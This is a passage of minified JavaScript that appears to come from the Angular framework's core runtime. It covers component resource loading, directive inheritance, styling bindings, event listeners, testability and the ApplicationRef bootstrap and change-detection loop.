  }
  return (
    ts.forEach((r, o) => {
      let s = [];
      r.templateUrl &&
        s.push(
          n(r.templateUrl).then((l) => {
            r.template = l;
          })
        );
      let a = "string" == typeof r.styles ? [r.styles] : r.styles || [];
      if (((r.styles = a), r.styleUrl && r.styleUrls?.length))
        throw new Error(
          "@Component cannot define both `styleUrl` and `styleUrls`. Use `styleUrl` if the component has one stylesheet, or `styleUrls` if it has multiple"
        );
      if (r.styleUrls?.length) {
        let l = r.styles.length,
          u = r.styleUrls;
        r.styleUrls.forEach((d, f) => {
          a.push(""),
            s.push(
              n(d).then((m) => {
                (a[l + f] = m),
                  u.splice(u.indexOf(d), 1),
                  0 == u.length && (r.styleUrls = void 0);
              })
            );
        });
      } else
        r.styleUrl &&
          s.push(
            n(r.styleUrl).then((l) => {
              a.push(l), (r.styleUrl = void 0);
            })
          );
      let c = Promise.all(s).then(() => nb(o));
      e.push(c);
    }),
    Jw(),
    Promise.all(e).then(() => {})
  );
}
var ts = new Map(),
  Xw = new Set();
function Jw() {
  let t = ts;
  return (ts = new Map()), t;
}
function eb() {
  return 0 === ts.size;
}
function tb(t) {
  return "string" == typeof t ? t : t.text();
}
function nb(t) {
  Xw.delete(t);
}
function ib(t) {
  return Object.getPrototypeOf(t.prototype).constructor;
}
function zt(t) {
  let e = ib(t.type),
    i = !0,
    n = [t];
  for (; e; ) {
    let r;
    if (un(t)) r = e.ɵcmp || e.ɵdir;
    else {
      if (e.ɵcmp) throw new D(903, !1);
      r = e.ɵdir;
    }
    if (r) {
      if (i) {
        n.push(r);
        let s = t;
        (s.inputs = Oo(t.inputs)),
          (s.inputTransforms = Oo(t.inputTransforms)),
          (s.declaredInputs = Oo(t.declaredInputs)),
          (s.outputs = Oo(t.outputs));
        let a = r.hostBindings;
        a && cb(t, a);
        let c = r.viewQuery,
          l = r.contentQueries;
        if (
          (c && sb(t, c),
          l && ab(t, l),
          rb(t, r),
          C_(t.outputs, r.outputs),
          un(r) && r.data.animation)
        ) {
          let u = t.data;
          u.animation = (u.animation || []).concat(r.data.animation);
        }
      }
      let o = r.features;
      if (o)
        for (let s = 0; s < o.length; s++) {
          let a = o[s];
          a && a.ngInherit && a(t), a === zt && (i = !1);
        }
    }
    e = Object.getPrototypeOf(e);
  }
  ob(n);
}
function rb(t, e) {
  for (let i in e.inputs) {
    if (!e.inputs.hasOwnProperty(i) || t.inputs.hasOwnProperty(i)) continue;
    let n = e.inputs[i];
    if (
      void 0 !== n &&
      ((t.inputs[i] = n),
      (t.declaredInputs[i] = e.declaredInputs[i]),
      null !== e.inputTransforms)
    ) {
      let r = Array.isArray(n) ? n[0] : n;
      if (!e.inputTransforms.hasOwnProperty(r)) continue;
      (t.inputTransforms ??= {}), (t.inputTransforms[r] = e.inputTransforms[r]);
    }
  }
}
function ob(t) {
  let e = 0,
    i = null;
  for (let n = t.length - 1; n >= 0; n--) {
    let r = t[n];
    (r.hostVars = e += r.hostVars),
      (r.hostAttrs = Ni(r.hostAttrs, (i = Ni(i, r.hostAttrs))));
  }
}
function Oo(t) {
  return t === Yn ? {} : t === Ie ? [] : t;
}
function sb(t, e) {
  let i = t.viewQuery;
  t.viewQuery = i
    ? (n, r) => {
        e(n, r), i(n, r);
      }
    : e;
}
function ab(t, e) {
  let i = t.contentQueries;
  t.contentQueries = i
    ? (n, r, o) => {
        e(n, r, o), i(n, r, o);
      }
    : e;
}
function cb(t, e) {
  let i = t.hostBindings;
  t.hostBindings = i
    ? (n, r) => {
        e(n, r), i(n, r);
      }
    : e;
}
function Wt(t) {
  let e = t.inputConfig,
    i = {};
  for (let n in e)
    if (e.hasOwnProperty(n)) {
      let r = e[n];
      Array.isArray(r) && r[3] && (i[n] = r[3]);
    }
  t.inputTransforms = i;
}
var Ut = class {},
  Hi = class {},
  ns = class extends Ut {
    constructor(e, i, n) {
      super(),
        (this._parent = i),
        (this._bootstrapComponents = []),
        (this.destroyCbs = []),
        (this.componentFactoryResolver = new es(this));
      let r = hh(e);
      (this._bootstrapComponents = yp(r.bootstrap)),
        (this._r3Injector = Jh(
          e,
          i,
          [
            { provide: Ut, useValue: this },
            { provide: Ht, useValue: this.componentFactoryResolver },
            ...n,
          ],
          we(e),
          new Set(["environment"])
        )),
        this._r3Injector.resolveInjectorInitializers(),
        (this.instance = this._r3Injector.get(e));
    }
    get injector() {
      return this._r3Injector;
    }
    destroy() {
      let e = this._r3Injector;
      !e.destroyed && e.destroy(),
        this.destroyCbs.forEach((i) => i()),
        (this.destroyCbs = null);
    }
    onDestroy(e) {
      this.destroyCbs.push(e);
    }
  },
  is = class extends Hi {
    constructor(e) {
      super(), (this.moduleType = e);
    }
    create(e) {
      return new ns(this.moduleType, e, []);
    }
  };
function lb(t, e, i) {
  return new ns(t, e, i);
}
var jc = class extends Ut {
  constructor(e) {
    super(),
      (this.componentFactoryResolver = new es(this)),
      (this.instance = null);
    let i = new ki(
      [
        ...e.providers,
        { provide: Ut, useValue: this },
        { provide: Ht, useValue: this.componentFactoryResolver },
      ],
      e.parent || Jc(),
      e.debugName,
      new Set(["environment"])
    );
    (this.injector = i),
      e.runEnvironmentInitializers && i.resolveInjectorInitializers();
  }
  destroy() {
    this.injector.destroy();
  }
  onDestroy(e) {
    this.injector.onDestroy(e);
  }
};
function Os(t, e, i = null) {
  return new jc({
    providers: t,
    parent: e,
    debugName: i,
    runEnvironmentInitializers: !0,
  }).injector;
}
var ir = (() => {
  let e = class e {
    constructor() {
      (this.taskId = 0),
        (this.pendingTasks = new Set()),
        (this.hasPendingTasks = new le(!1));
    }
    get _hasPendingTasks() {
      return this.hasPendingTasks.value;
    }
    add() {
      this._hasPendingTasks || this.hasPendingTasks.next(!0);
      let n = this.taskId++;
      return this.pendingTasks.add(n), n;
    }
    remove(n) {
      this.pendingTasks.delete(n),
        0 === this.pendingTasks.size &&
          this._hasPendingTasks &&
          this.hasPendingTasks.next(!1);
    }
    ngOnDestroy() {
      this.pendingTasks.clear(),
        this._hasPendingTasks && this.hasPendingTasks.next(!1);
    }
  };
  return (
    (e.ɵfac = function (r) {
      return new (r || e)();
    }),
    (e.ɵprov = y({ token: e, factory: e.ɵfac, providedIn: "root" })),
    e
  );
})();
function ag(t) {
  return (
    !!db(t) &&
    (Array.isArray(t) || (!(t instanceof Map) && Symbol.iterator in t))
  );
}
function ub(t, e) {
  if (Array.isArray(t)) for (let i = 0; i < t.length; i++) e(t[i]);
  else {
    let n,
      i = t[Symbol.iterator]();
    for (; !(n = i.next()).done; ) e(n.value);
  }
}
function db(t) {
  return null !== t && ("function" == typeof t || "object" == typeof t);
}
function Is(t, e, i) {
  let n = t[e];
  return !Object.is(n, i) && ((t[e] = i), !0);
}
function rr(t) {
  return !(32 & ~t.flags);
}
function fb(t, e, i, n, r, o, s, a, c) {
  let l = e.consts,
    u = ws(e, t, 4, s || null, $o(l, a));
  Vp(e, i, u, $o(l, c)), ul(e, u);
  let d = (u.tView = El(
    2,
    u,
    n,
    r,
    o,
    e.directiveRegistry,
    e.pipeRegistry,
    null,
    e.schemas,
    l,
    null
  ));
  return (
    null !== e.queries &&
      (e.queries.template(e, u), (d.queries = e.queries.embeddedTView(u))),
    u
  );
}
function et(t, e, i, n, r, o, s, a) {
  let c = X(),
    l = je(),
    u = t + Se,
    d = l.firstCreatePass ? fb(u, l, c, e, i, n, r, o, s) : l.data[u];
  Ki(d, !1);
  let f = cg(l, c, d, t);
  ll() && Ml(l, c, f, d), fn(f, c);
  let m = $p(f, c, f, d);
  return (
    (c[u] = m),
    bs(c, m),
    Lw(m, d, c),
    tl(d) && Np(l, c, d),
    null != s && kp(c, d, a),
    et
  );
}
var cg = lg;
function lg(t, e, i, n) {
  return ht(!0), e[ne].createComment("");
}
function hb(t, e, i, n) {
  let r = e[Ze],
    o = !r || Qi() || rr(i) || gs(r, n);
  if ((ht(o), o)) return lg(t, e, i, n);
  let s = r.data[xC]?.[n] ?? null;
  null !== s &&
    null !== i.tView &&
    null === i.tView.ssrId &&
    (i.tView.ssrId = s);
  let a = Ms(r, t, e, i);
  return ps(r, n, a), Ds(vl(r, n), a);
}
function pb() {
  cg = hb;
}
function xt(t, e, i, n) {
  let r = X();
  if (Is(r, rl(), e)) {
    je();
    k0(cl(), r, t, e, i, n);
  }
  return xt;
}
function Io(t, e) {
  return (t << 17) | (e << 2);
}
function pn(t) {
  return (t >> 17) & 32767;
}
function gb(t) {
  return !(2 & ~t);
}
function mb(t, e) {
  return (131071 & t) | (e << 17);
}
function Vc(t) {
  return 2 | t;
}
function Jn(t) {
  return (131068 & t) >> 2;
}
function Xa(t, e) {
  return (-131069 & t) | (e << 2);
}
function vb(t) {
  return !(1 & ~t);
}
function Bc(t) {
  return 1 | t;
}
function _b(t, e, i, n, r, o) {
  let s = o ? e.classBindings : e.styleBindings,
    a = pn(s),
    c = Jn(s);
  t[n] = i;
  let u,
    l = !1;
  if (Array.isArray(i)) {
    let d = i;
    (u = d[1]), (null === u || Gi(d, u) > 0) && (l = !0);
  } else u = i;
  if (r)
    if (0 !== c) {
      let f = pn(t[a + 1]);
      (t[n + 1] = Io(f, a)),
        0 !== f && (t[f + 1] = Xa(t[f + 1], n)),
        (t[a + 1] = mb(t[a + 1], n));
    } else
      (t[n + 1] = Io(a, 0)), 0 !== a && (t[a + 1] = Xa(t[a + 1], n)), (a = n);
  else
    (t[n + 1] = Io(c, 0)),
      0 === a ? (a = n) : (t[c + 1] = Xa(t[c + 1], n)),
      (c = n);
  l && (t[n + 1] = Vc(t[n + 1])),
    jf(t, u, n, !0),
    jf(t, u, n, !1),
    yb(e, u, t, n, o),
    (s = Io(a, c)),
    o ? (e.classBindings = s) : (e.styleBindings = s);
}
function yb(t, e, i, n, r) {
  let o = r ? t.residualClasses : t.residualStyles;
  null != o &&
    "string" == typeof e &&
    Gi(o, e) >= 0 &&
    (i[n + 1] = Bc(i[n + 1]));
}
function jf(t, e, i, n) {
  let r = t[i + 1],
    o = null === e,
    s = n ? pn(r) : Jn(r),
    a = !1;
  for (; 0 !== s && (!1 === a || o); ) {
    let c = t[s],
      l = t[s + 1];
    Cb(c, e) && ((a = !0), (t[s + 1] = n ? Bc(l) : Vc(l))),
      (s = n ? pn(l) : Jn(l));
  }
  a && (t[i + 1] = n ? Vc(r) : Bc(r));
}
function Cb(t, e) {
  return (
    null === t ||
    null == e ||
    (Array.isArray(t) ? t[1] : t) === e ||
    (!(!Array.isArray(t) || "string" != typeof e) && Gi(t, e) >= 0)
  );
}
function Et(t, e, i) {
  let n = X();
  if (Is(n, rl(), e)) {
    jp(je(), cl(), n, t, e, n[ne], i, !1);
  }
  return Et;
}
function Vf(t, e, i, n, r) {
  let s = r ? "class" : "style";
  Ol(t, i, e.inputs[s], s, n);
}
function Gt(t, e) {
  return wb(t, e, null, !0), Gt;
}
function wb(t, e, i, n) {
  let r = X(),
    o = je(),
    s = Uy(2);
  if ((o.firstUpdatePass && Mb(o, t, s, n), e !== ys && Is(r, s, e))) {
    Ib(o, o.data[Xi()], r, r[ne], t, (r[s + 1] = Pb(e, i)), n, s);
  }
}
function bb(t, e) {
  return e >= t.expandoStartIndex;
}
function Mb(t, e, i, n) {
  let r = t.data;
  if (null === r[i + 1]) {
    let o = r[Xi()],
      s = bb(t, i);
    Sb(o, n) && null === e && !s && (e = !1),
      _b(r, o, (e = Db(r, o, e, n)), i, s, n);
  }
}
function Db(t, e, i, n) {
  let r = Wy(t),
    o = n ? e.residualClasses : e.residualStyles;
  if (null === r)
    0 === (n ? e.classBindings : e.styleBindings) &&
      ((i = zi((i = Ja(null, t, e, i, n)), e.attrs, n)), (o = null));
  else {
    let s = e.directiveStylingLast;
    if (-1 === s || t[s] !== r)
      if (((i = Ja(r, t, e, i, n)), null === o)) {
        let c = xb(t, e, n);
        void 0 !== c &&
          Array.isArray(c) &&
          ((c = Ja(null, t, e, c[1], n)),
          (c = zi(c, e.attrs, n)),
          Eb(t, e, n, c));
      } else o = Ob(t, e, n);
  }
  return (
    void 0 !== o && (n ? (e.residualClasses = o) : (e.residualStyles = o)), i
  );
}
function xb(t, e, i) {
  let n = i ? e.classBindings : e.styleBindings;
  if (0 !== Jn(n)) return t[pn(n)];
}
function Eb(t, e, i, n) {
  t[pn(i ? e.classBindings : e.styleBindings)] = n;
}
function Ob(t, e, i) {
  let n,
    r = e.directiveEnd;
  for (let o = 1 + e.directiveStylingLast; o < r; o++) {
    n = zi(n, t[o].hostAttrs, i);
  }
  return zi(n, e.attrs, i);
}
function Ja(t, e, i, n, r) {
  let o = null,
    s = i.directiveEnd,
    a = i.directiveStylingLast;
  for (
    -1 === a ? (a = i.directiveStart) : a++;
    a < s && ((o = e[a]), (n = zi(n, o.hostAttrs, r)), o !== t);

  )
    a++;
  return null !== t && (i.directiveStylingLast = a), n;
}
function zi(t, e, i) {
  let n = i ? 1 : 2,
    r = -1;
  if (null !== e)
    for (let o = 0; o < e.length; o++) {
      let s = e[o];
      "number" == typeof s
        ? (r = s)
        : r === n &&
          (Array.isArray(t) || (t = void 0 === t ? [] : ["", t]),
          $_(t, s, !!i || e[++o]));
    }
  return void 0 === t ? null : t;
}
function Ib(t, e, i, n, r, o, s, a) {
  if (!(3 & e.type)) return;
  let c = t.data,
    l = c[a + 1];
  if (!rs(vb(l) ? Bf(c, e, i, r, Jn(l), s) : void 0)) {
    rs(o) || (gb(l) && (o = Bf(c, null, i, r, a, s))),
      d0(n, s, Ey(Xi(), i), r, o);
  }
}
function Bf(t, e, i, n, r, o) {
  let a,
    s = null === e;
  for (; r > 0; ) {
    let c = t[r],
      l = Array.isArray(c),
      u = l ? c[1] : c,
      d = null === u,
      f = i[r + 1];
    f === ys && (f = d ? Ie : void 0);
    let m = d ? Ba(f, n) : u === n ? f : void 0;
    if ((l && !rs(m) && (m = Ba(c, n)), rs(m) && ((a = m), s))) return a;
    let w = t[r + 1];
    r = s ? pn(w) : Jn(w);
  }
  if (null !== e) {
    let c = o ? e.residualClasses : e.residualStyles;
    null != c && (a = Ba(c, n));
  }
  return a;
}
function rs(t) {
  return void 0 !== t;
}
function Pb(t, e) {
  return (
    null == t ||
      "" === t ||
      ("string" == typeof e
        ? (t += e)
        : "object" == typeof t && (t = we(tr(t)))),
    t
  );
}
function Sb(t, e) {
  return !!(t.flags & (e ? 8 : 16));
}
function Tb(t, e, i, n, r, o) {
  let s = e.consts,
    c = ws(e, t, 2, n, $o(s, r));
  return (
    Vp(e, i, c, $o(s, o)),
    null !== c.attrs && Pc(c, c.attrs, !1),
    null !== c.mergedAttrs && Pc(c, c.mergedAttrs, !0),
    null !== e.queries && e.queries.elementStart(e, c),
    c
  );
}
function p(t, e, i, n) {
  let r = X(),
    o = je(),
    s = Se + t,
    a = r[ne],
    c = o.firstCreatePass ? Tb(s, o, r, e, i, n) : o.data[s],
    l = ug(o, r, c, a, e, t);
  r[s] = l;
  let u = tl(c);
  return (
    Ki(c, !0),
    Op(a, l, c),
    !rr(c) && ll() && Ml(o, r, l, c),
    0 === Ay() && fn(l, r),
    Ry(),
    u && (Np(o, r, c), Rp(o, c, r)),
    null !== n && kp(r, c),
    p
  );
}
function g() {
  let t = Ve();
  Rh() ? Vy() : ((t = t.parent), Ki(t, !1));
  let e = t;
  ky(e) && Ly(), Ny();
  let i = je();
  return (
    i.firstCreatePass && (ul(i, t), bh(t) && i.queries.elementEnd(t)),
    null != e.classesWithoutHost &&
      Ky(e) &&
      Vf(i, e, X(), e.classesWithoutHost, !0),
    null != e.stylesWithoutHost &&
      Xy(e) &&
      Vf(i, e, X(), e.stylesWithoutHost, !1),
    g
  );
}
function B(t, e, i, n) {
  return p(t, e, i, n), g(), B;
}
var ug = (t, e, i, n, r, o) => (ht(!0), vs(n, r, Bh()));
function Ab(t, e, i, n, r, o) {
  let s = e[Ze],
    a = !s || Qi() || rr(i) || gs(s, o);
  if ((ht(a), a)) return vs(n, r, Bh());
  let c = Ms(s, t, e, i);
  return (
    hp(s, o) && ps(s, o, c.nextSibling),
    s && (tp(i) || np(c)) && Zi(i) && (Fy(i), xp(c)),
    c
  );
}
function Rb() {
  ug = Ab;
}
var Nb = (t, e, i, n) => (ht(!0), wl(e[ne], ""));
function kb(t, e, i, n) {
  let r,
    o = e[Ze],
    s = !o || Qi() || rr(i);
  if ((ht(s), s)) return wl(e[ne], "");
  let a = Ms(o, t, e, i),
    c = FC(o, n);
  return ps(o, n, a), (r = Ds(c, a)), r;
}
function Fb() {
  Nb = kb;
}
function dg() {
  return X();
}
function Ps(t, e, i) {
  let n = X();
  if (Is(n, rl(), e)) {
    jp(je(), cl(), n, t, e, n[ne], i, !0);
  }
  return Ps;
}
var os = "en-US",
  Lb = os;
function jb(t) {
  "string" == typeof t && (Lb = t.toLowerCase().replace(/_/g, "-"));
}
function fg(t, e, i) {
  let n = t[ne];
  switch (i) {
    case Node.COMMENT_NODE:
      return wl(n, e);
    case Node.TEXT_NODE:
      return Cl(n, e);
    case Node.ELEMENT_NODE:
      return vs(n, e, null);
  }
}
var Vb = (t, e, i, n) => (ht(!0), fg(t, i, n));
function Bb(t, e, i, n) {
  return ht(!0), fg(t, i, n);
}
function Ub() {
  Vb = Bb;
}
function oe(t, e, i, n) {
  let r = X(),
    o = je(),
    s = Ve();
  return Hb(o, r, r[ne], s, t, e, n), oe;
}
function $b(t, e, i, n) {
  let r = t.cleanup;
  if (null != r)
    for (let o = 0; o < r.length - 1; o += 2) {
      let s = r[o];
      if (s === i && r[o + 1] === n) {
        let a = e[Fi],
          c = r[o + 2];
        return a.length > c ? a[c] : null;
      }
      "string" == typeof s && (o += 2);
    }
  return null;
}
function Hb(t, e, i, n, r, o, s) {
  let a = tl(n),
    l = t.firstCreatePass && Wp(t),
    u = e[Qe],
    d = zp(e),
    f = !0;
  if (3 & n.type || s) {
    let M = Te(n, e),
      G = s ? s(M) : M,
      H = d.length,
      me = s ? (_t) => s(Xe(_t[n.index])) : n.index,
      ve = null;
    if ((!s && a && (ve = $b(t, e, r, n.index)), null !== ve)) {
      ((ve.__ngLastListenerFn__ || ve).__ngNextListenerFn__ = o),
        (ve.__ngLastListenerFn__ = o),
        (f = !1);
    } else {
      o = $f(n, e, u, o, !1);
      let _t = i.listen(G, r, o);
      d.push(o, _t), l && l.push(r, me, H, H + 1);
    }
  } else o = $f(n, e, u, o, !1);
  let w,
    m = n.outputs;
  if (f && null !== m && (w = m[r])) {
    let M = w.length;
    if (M)
      for (let G = 0; G < M; G += 2) {
        let H = w[G],
          me = w[G + 1],
          On = e[H][me].subscribe(o),
          ze = d.length;
        d.push(o, On), l && l.push(r, n.index, ze, -(ze + 1));
      }
  }
}
function Uf(t, e, i, n) {
  let r = z(null);
  try {
    return at(6, e, i), !1 !== i(n);
  } catch (o) {
    return Gp(t, o), !1;
  } finally {
    at(7, e, i), z(r);
  }
}
function $f(t, e, i, n, r) {
  return function o(s) {
    if (s === Function) return n;
    Pl(t.componentOffset > -1 ? $t(t.index, e) : e);
    let c = Uf(e, i, n, s),
      l = o.__ngNextListenerFn__;
    for (; l; ) (c = Uf(e, i, l, s) && c), (l = l.__ngNextListenerFn__);
    return r && !1 === c && s.preventDefault(), c;
  };
}
function mn(t = 1) {
  return qy(t);
}
function Ss(t, e, i) {
  qw(t, e, i);
}
function or(t) {
  let e = X(),
    i = je(),
    n = Nh();
  ol(n + 1);
  let r = Nl(i, n);
  if (t.dirty && Oy(e) === !(2 & ~r.metadata.flags)) {
    if (null === r.matches) t.reset([]);
    else {
      let o = Qw(e, n);
      t.reset(o, fC), t.notifyOnChanges();
    }
    return !0;
  }
  return !1;
}
function sr() {
  return Ww(X(), Nh());
}
function _(t, e = "") {
  let i = X(),
    n = je(),
    r = t + Se,
    o = n.firstCreatePass ? ws(n, r, 1, e, null) : n.data[r],
    s = hg(n, i, o, e, t);
  (i[r] = s), ll() && Ml(n, i, s, o), Ki(o, !1);
}
var hg = (t, e, i, n, r) => (ht(!0), Cl(e[ne], n));
function zb(t, e, i, n, r) {
  let o = e[Ze],
    s = !o || Qi() || rr(i) || gs(o, r);
  return ht(s), s ? Cl(e[ne], n) : Ms(o, t, e, i);
}
function Wb() {
  hg = zb;
}
var Gb = (() => {
  let e = class e {
    constructor(n) {
      (this._injector = n), (this.cachedInjectors = new Map());
    }
    getOrCreateStandaloneInjector(n) {
      if (!n.standalone) return null;
      if (!this.cachedInjectors.has(n)) {
        let r = mh(!1, n.type),
          o =
            r.length > 0
              ? Os([r], this._injector, `Standalone[${n.type.name}]`)
              : null;
        this.cachedInjectors.set(n, o);
      }
      return this.cachedInjectors.get(n);
    }
    ngOnDestroy() {
      try {
        for (let n of this.cachedInjectors.values()) null !== n && n.destroy();
      } finally {
        this.cachedInjectors.clear();
      }
    }
  };
  return (
    (e.ɵprov = y({
      token: e,
      providedIn: "environment",
      factory: () => new e(h(Oe)),
    })),
    e
  );
})();
function qt(t) {
  si("NgStandalone"),
    (t.getStandaloneInjector = (e) =>
      e.get(Gb).getOrCreateStandaloneInjector(t));
}
var Po = null;
function qb(t) {
  (null !== Po &&
    (t.defaultEncapsulation !== Po.defaultEncapsulation ||
      t.preserveWhitespaces !== Po.preserveWhitespaces)) ||
    (Po = t);
}
var Fl,
  Ts = (() => {
    let e = class e {
      log(n) {
        console.log(n);
      }
      warn(n) {
        console.warn(n);
      }
    };
    return (
      (e.ɵfac = function (r) {
        return new (r || e)();
      }),
      (e.ɵprov = y({ token: e, factory: e.ɵfac, providedIn: "platform" })),
      e
    );
  })(),
  kl = new b(""),
  ar = new b(""),
  As = (() => {
    let e = class e {
      constructor(n, r, o) {
        (this._ngZone = n),
          (this.registry = r),
          (this._pendingCount = 0),
          (this._isZoneStable = !0),
          (this._callbacks = []),
          (this.taskTrackingZone = null),
          Fl || (Yb(o), o.addToWindow(r)),
          this._watchAngularEvents(),
          n.run(() => {
            this.taskTrackingZone =
              typeof Zone > "u" ? null : Zone.current.get("TaskTrackingZone");
          });
      }
      _watchAngularEvents() {
        this._ngZone.onUnstable.subscribe({
          next: () => {
            this._isZoneStable = !1;
          },
        }),
          this._ngZone.runOutsideAngular(() => {
            this._ngZone.onStable.subscribe({
              next: () => {
                O.assertNotInAngularZone(),
                  queueMicrotask(() => {
                    (this._isZoneStable = !0), this._runCallbacksIfReady();
                  });
              },
            });
          });
      }
      increasePendingRequestCount() {
        return (this._pendingCount += 1), this._pendingCount;
      }
      decreasePendingRequestCount() {
        if (((this._pendingCount -= 1), this._pendingCount < 0))
          throw new Error("pending async requests below zero");
        return this._runCallbacksIfReady(), this._pendingCount;
      }
      isStable() {
        return (
          this._isZoneStable &&
          0 === this._pendingCount &&
          !this._ngZone.hasPendingMacrotasks
        );
      }
      _runCallbacksIfReady() {
        if (this.isStable())
          queueMicrotask(() => {
            for (; 0 !== this._callbacks.length; ) {
              let n = this._callbacks.pop();
              clearTimeout(n.timeoutId), n.doneCb();
            }
          });
        else {
          let n = this.getPendingTasks();
          this._callbacks = this._callbacks.filter(
            (r) =>
              !r.updateCb || !r.updateCb(n) || (clearTimeout(r.timeoutId), !1)
          );
        }
      }
      getPendingTasks() {
        return this.taskTrackingZone
          ? this.taskTrackingZone.macroTasks.map((n) => ({
              source: n.source,
              creationLocation: n.creationLocation,
              data: n.data,
            }))
          : [];
      }
      addCallback(n, r, o) {
        let s = -1;
        r &&
          r > 0 &&
          (s = setTimeout(() => {
            (this._callbacks = this._callbacks.filter(
              (a) => a.timeoutId !== s
            )),
              n();
          }, r)),
          this._callbacks.push({ doneCb: n, timeoutId: s, updateCb: o });
      }
      whenStable(n, r, o) {
        if (o && !this.taskTrackingZone)
          throw new Error(
            'Task tracking zone is required when passing an update callback to whenStable(). Is "zone.js/plugins/task-tracking" loaded?'
          );
        this.addCallback(n, r, o), this._runCallbacksIfReady();
      }
      getPendingRequestCount() {
        return this._pendingCount;
      }
      registerApplication(n) {
        this.registry.registerApplication(n, this);
      }
      unregisterApplication(n) {
        this.registry.unregisterApplication(n);
      }
      findProviders(n, r, o) {
        return [];
      }
    };
    return (
      (e.ɵfac = function (r) {
        return new (r || e)(h(O), h(Rs), h(ar));
      }),
      (e.ɵprov = y({ token: e, factory: e.ɵfac })),
      e
    );
  })(),
  Rs = (() => {
    let e = class e {
      constructor() {
        this._applications = new Map();
      }
      registerApplication(n, r) {
        this._applications.set(n, r);
      }
      unregisterApplication(n) {
        this._applications.delete(n);
      }
      unregisterAllApplications() {
        this._applications.clear();
      }
      getTestability(n) {
        return this._applications.get(n) || null;
      }
      getAllTestabilities() {
        return Array.from(this._applications.values());
      }
      getAllRootElements() {
        return Array.from(this._applications.keys());
      }
      findTestabilityInTree(n, r = !0) {
        return Fl?.findTestabilityInTree(this, n, r) ?? null;
      }
    };
    return (
      (e.ɵfac = function (r) {
        return new (r || e)();
      }),
      (e.ɵprov = y({ token: e, factory: e.ɵfac, providedIn: "platform" })),
      e
    );
  })();
function Yb(t) {
  Fl = t;
}
function cr(t) {
  return !!t && "function" == typeof t.then;
}
function pg(t) {
  return !!t && "function" == typeof t.subscribe;
}
var Ns = new b(""),
  gg = (() => {
    let e = class e {
      constructor() {
        (this.initialized = !1),
          (this.done = !1),
          (this.donePromise = new Promise((n, r) => {
            (this.resolve = n), (this.reject = r);
          })),
          (this.appInits = v(Ns, { optional: !0 }) ?? []);
      }
      runInitializers() {
        if (this.initialized) return;
        let n = [];
        for (let o of this.appInits) {
          let s = o();
          if (cr(s)) n.push(s);
          else if (pg(s)) {
            let a = new Promise((c, l) => {
              s.subscribe({ complete: c, error: l });
            });
            n.push(a);
          }
        }
        let r = () => {
          (this.done = !0), this.resolve();
        };
        Promise.all(n)
          .then(() => {
            r();
          })
          .catch((o) => {
            this.reject(o);
          }),
          0 === n.length && r(),
          (this.initialized = !0);
      }
    };
    return (
      (e.ɵfac = function (r) {
        return new (r || e)();
      }),
      (e.ɵprov = y({ token: e, factory: e.ɵfac, providedIn: "root" })),
      e
    );
  })(),
  ai = new b("");
function Zb() {
  Id(() => {
    throw new D(600, !1);
  });
}
function Qb(t) {
  return t.isBoundToModule;
}
function Kb(t, e, i) {
  try {
    let n = i();
    return cr(n)
      ? n.catch((r) => {
          throw (e.runOutsideAngular(() => t.handleError(r)), r);
        })
      : n;
  } catch (n) {
    throw (e.runOutsideAngular(() => t.handleError(n)), n);
  }
}
function mg(t, e) {
  return Array.isArray(e) ? e.reduce(mg, t) : C(C({}, t), e);
}
var So,
  tt = (() => {
    let e = class e {
      constructor() {
        (this._bootstrapListeners = []),
          (this._runningTick = !1),
          (this._destroyed = !1),
          (this._destroyListeners = []),
          (this._views = []),
          (this.internalErrorHandler = v(ep)),
          (this.afterRenderEffectManager = v(Al)),
          (this.externalTestViews = new Set()),
          (this.beforeRender = new N()),
          (this.afterTick = new N()),
          (this.componentTypes = []),
          (this.components = []),
          (this.isStable = v(ir).hasPendingTasks.pipe(F((n) => !n))),
          (this._injector = v(Oe));
      }
      get destroyed() {
        return this._destroyed;
      }
      get injector() {
        return this._injector;
      }
      bootstrap(n, r) {
        let a,
          o = n instanceof Jo;
        if (!this._injector.get(gg).done) {
          !o && fh(n);
          throw new D(405, !1);
        }
        (a = o ? n : this._injector.get(Ht).resolveComponentFactory(n)),
          this.componentTypes.push(a.componentType);
        let c = Qb(a) ? void 0 : this._injector.get(Ut),
          l = r || a.selector,
          u = a.create(re.NULL, [], l, c),
          d = u.location.nativeElement,
          f = u.injector.get(kl, null);
        return (
          f?.registerApplication(d),
          u.onDestroy(() => {
            this.detachView(u.hostView),
              Fo(this.components, u),
              f?.unregisterApplication(d);
          }),
          this._loadComponent(u),
          u
        );
      }
      tick() {
        this._tick(!0);
      }
      _tick(n) {
        if (this._runningTick) throw new D(101, !1);
        let r = z(null);
        try {
          (this._runningTick = !0), this.detectChangesInAttachedViews(n);
        } catch (o) {
          this.internalErrorHandler(o);
        } finally {
          this.afterTick.next(), (this._runningTick = !1), z(r);
        }
      }
      detectChangesInAttachedViews(n) {
        let r = 0,
          o = this.afterRenderEffectManager;
        for (;;) {
          if (r === Yp) throw new D(103, !1);
          if (n) {
            let s = 0 === r;
            this.beforeRender.next(s);
            for (let { _lView: a, notifyErrorHandler: c } of this._views)
              Xb(a, s, c);
          }
          if (
            (r++,
            o.executeInternalCallbacks(),
            ![...this.externalTestViews.keys(), ...this._views].some(
              ({ _lView: s }) => Uc(s)
            ) &&
              (o.execute(),
              ![...this.externalTestViews.keys(), ...this._views].some(
                ({ _lView: s }) => Uc(s)
              )))
          )
            break;
        }
      }
      attachView(n) {
        let r = n;
        this._views.push(r), r.attachToAppRef(this);
      }
      detachView(n) {
        let r = n;
        Fo(this._views, r), r.detachFromAppRef();
      }
      _loadComponent(n) {
        this.attachView(n.hostView), this.tick(), this.components.push(n);
        let r = this._injector.get(ai, []);
        [...this._bootstrapListeners, ...r].forEach((o) => o(n));
      }
      ngOnDestroy() {
        if (!this._destroyed)
          try {
            this._destroyListeners.forEach((n) => n()),
              this._views.slice().forEach((n) => n.destroy());
          } finally {
            (this._destroyed = !0),
              (this._views = []),
              (this._bootstrapListeners = []),
              (this._destroyListeners = []);
          }
      }
      onDestroy(n) {
        return (
          this._destroyListeners.push(n), () => Fo(this._destroyListeners, n)
        );
      }
      destroy() {
        if (this._destroyed) throw new D(406, !1);
        let n = this._injector;
        n.destroy && !n.destroyed && n.destroy();
      }
      get viewCount() {
        return this._views.length;
      }
      warnIfDestroyed() {}
    };
    return (
      (e.ɵfac = function (r) {
        return new (r || e)();
      }),
      (e.ɵprov = y({ token: e, factory: e.ɵfac, providedIn: "root" })),
      e
    );
  })();
function Fo(t, e) {
  let i = t.indexOf(e);
  i > -1 && t.splice(i, 1);
}
function Ll(t) {
  So ??= new WeakMap();
  let e = So.get(t);
